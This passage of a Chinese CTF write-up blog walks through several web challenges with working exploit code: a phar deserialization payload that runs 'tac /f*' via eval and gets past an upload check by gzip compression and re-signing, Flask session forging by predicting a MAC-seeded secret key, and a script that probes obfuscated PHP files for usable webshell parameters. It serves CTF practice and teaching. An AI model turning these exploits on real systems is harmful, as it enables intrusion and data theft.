class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实就是要构造phar文件了。</p><p>再读取upload.php，查看相关过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传异常&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">gettype</span>(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltj一眼就发现了phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功 ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现存在对__HALT_COMPILER();的检测。可以用两种方法来绕过</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112240952.png" alt="image-20241222112240952"></p><p>来吧，先构造恶意phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//删除之前的test.phar文件(如果有)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//创建一个phar对象，文件名必须以phar为后缀</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//开始写文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//写入stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里注意构造完要用winhex改属性数量！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line"> f = file.read()</span><br><span class="line">newf = gzip.compress(f) <span class="comment">#对Phar⽂件进⾏gzip压缩</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;capoo.gif&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:<span class="comment">#更改⽂件后缀</span></span><br><span class="line"> file.write(newf)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112644143.png" alt="image-20241222112644143"></p><p>尝试phar文件包含，他说broken signature，签名有问题？！</p><p>当我们更改test.phar文件的内容时，签名会变得无效，因此我们需要换一个签名！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112807470.png" alt="image-20241222112807470"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newtest.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222113111949.png" alt="image-20241222113111949"></p><p>拿捏了！</p><h2 id="CISCN-2019华东南-Web4"><a href="#CISCN-2019华东南-Web4" class="headerlink" title="[CISCN 2019华东南]Web4"></a>[CISCN 2019华东南]Web4</h2><p>开局发现任意文件读取</p><p>python网站，那就直接读源码。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161153662.png" alt="image-20241222161153662"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>思路就是改session。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161704265.png" alt="image-20241222161704265"></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161718945.png" alt="image-20241222161718945" style="zoom:67%;" /><p>接下来如果我们能获取到secret_key那就大功告成了。</p><p>然后我发现了一个解题关键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure><p>只要我们获取到uuid.getnode()，那么就知道种子了，就可以知道secret_key了.</p><p>uuid.getnode()返回计算机的<strong>网络接口卡（NIC）地址</strong>，通常是设备的 MAC 地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sys/class/net/eth0/address</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222162400463.png" alt="image-20241222162400463"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:82:0a</span><br></pre></td></tr></table></figure><p>这道题前面写到过啊我丢，突然意识到。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0x0242ac02820a</span>)</span><br><span class="line">sec=<span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line"><span class="built_in">print</span>(sec)</span><br></pre></td></tr></table></figure><p>这里踩到坑了，python2的环境！！！</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222164000955.png" alt="image-20241222164000955"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222163953824.png" alt="image-20241222163953824"></p><p>这里不知道为啥不能用原来的格式，奇怪</p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104912732.png" alt="image-20241223104912732"></p><p>给了源码</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104936822.png" alt="image-20241223104936822" style="zoom:80%;" /><p>一堆混淆过的不知道是啥的文件，超级多。</p><p>我们放d盾跑一下</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105009974.png" alt="image-20241223105009974" style="zoom:80%;" /><p>几乎都有问题，直接随便找一个试试。</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105356197.png" alt="image-20241223105356197"></p><p>执行不了！</p><p>那就跑跑脚本，找出能执行的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间： &#x27;</span>+ time.asctime(time.localtime(time.time())))</span><br><span class="line"></span><br><span class="line"><span class="comment">#控制线程的最大数量</span></span><br><span class="line">s1 = threading.Semaphore(<span class="number">100</span>)</span><br><span class="line">filePath=<span class="string">r&#x27;D:\newphpstudy\phpstudy_pro\WWW\src&#x27;</span></span><br><span class="line">os.chdir(filePath)</span><br><span class="line"><span class="comment">#设置重连次数，防止线程过高，断开连接</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span></span><br><span class="line">files=os.listdir(filePath)</span><br><span class="line">session=requests.session()</span><br><span class="line"><span class="comment">#设置连接的活跃状态为false</span></span><br><span class="line">session.keep_alive=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    <span class="comment">#print(&#x27;tring  &#x27; + file + &#x27;   &#x27; + time.asctime(time.localtime(time.time())))</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">        gets=<span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,f.read()))</span><br><span class="line">        posts=<span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,f.read()))</span><br><span class="line"></span><br><span class="line">    data=&#123;&#125;</span><br><span class="line">    params=&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> gets:</span><br><span class="line">        params[i]=<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> posts:</span><br><span class="line">        data[j]=<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    target=<span class="string">&quot;http://127.0.0.1/src/&quot;</span>+file</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(target)</span></span><br><span class="line">    res=session.post(target,data=data,params=params)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    res.close()</span><br><span class="line">    res.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> gets:</span><br><span class="line">            res=session.get(target+<span class="string">&#x27;?%s=&#x27;</span>%i+<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> posts:</span><br><span class="line">                res = session.post(target,data=&#123;j:<span class="string">&quot;echo &#x27;123456&#x27;;&quot;</span>&#125;)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;123456&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag==<span class="number">1</span>:</span><br><span class="line">            params=i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            params=j</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span> + file + <span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> % params)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间： &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">    t=threading.Thread(target=get_content,args=(f,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113609841.png" alt="image-20241223113609841"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113620325.png" alt="image-20241223113620325"></p><p>拿捏了！</p><h2 id="prize-p2"><a href="#prize-p2" class="headerlink" title="prize_p2"></a>prize_p2</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; randomBytes &#125; = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fp = <span class="string">&#x27;/app/src/flag.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> flag = <span class="title class_">Buffer</span>(<span class="number">255</span>);</span><br><span class="line"><span class="keyword">const</span> a = fs.<span class="title function_">open</span>(fp, <span class="string">&#x27;r&#x27;</span>, <span class="function">(<span class="params">err, fd</span>) =&gt;</span> &#123;</span><br><span class="line">    fs.<span class="title function_">read</span>(fd, flag, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        fs.<span class="title function_">rm</span>(fp, <span class="function">() =&gt;</span> &#123;&#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(__filename));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/hint&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(flag.<span class="title function_">toString</span>().<span class="title function_">slice</span>(<span class="number">0</span>, <span class="title function_">randomBytes</span>(<span class="number">1</span>)[<span class="number">0</span>]%<span class="number">32</span>));</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随机数预测或者一天之后</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/getflag&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">        <span class="keyword">if</span> (a === <span class="title function_">randomBytes</span>(<span class="number">3</span>).<span class="title function_">toString</span>()) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">b</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">b</span>));</span><br><span class="line">            &#125;, <span class="built_in">parseInt</span>(req.<span class="property">query</span>.<span class="property">c</span>)?<span class="title class_">Math</span>.<span class="title function_">max</span>(<span 